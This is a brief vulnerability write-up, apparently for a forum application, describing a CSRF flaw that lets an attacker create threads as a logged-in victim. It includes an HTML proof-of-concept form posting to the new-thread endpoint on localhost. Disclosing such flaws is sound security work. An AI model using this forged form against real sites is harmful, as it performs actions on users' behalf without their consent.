# New Threads/Posts CSRF
Allows to create new threads through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form id="LAYER_form" action="http://localhost/new.php/node/1" method="POST" style="padding: 25px;">
  <input type="text" name="title" placeholder="Thread Title..." style="width:100%;" class="col-sm-9 form-control">
  <div class="clearfix"></div>
  <br>
  <textarea id="editor" style="width: 100%; height: 300px; max-width: 100%;" name="content"></textarea>

  <div class="center-block" style="margin-top:5px;">
      <input type="submit" name="create" value="Create Thread">
  </div>

  <br>
  <ul class="nav nav-tabs">
      <li class="active"><a href="#polls" data-toggle="tab">Polls</a></li>
  </ul>
  <div class="tab-content">
      <div class="tab-pane active" id="polls">
           <div class="col-md-6">
               <label for="question">Question</label>
               <input type="text" name="question">
               <label for="answer_1">1. Answer</label>
               <input type="text" name="answer_1" id="answer_1">
               <label for="answer_2">2. Answer</label>
               <input type="text" name="answer_2" id="answer_2">
               <span class="btn btn-primary btn-xs" href="" onclick="plus();"> Add an answer field </span>
           </div>
      </div>
  </div>
</form>
```
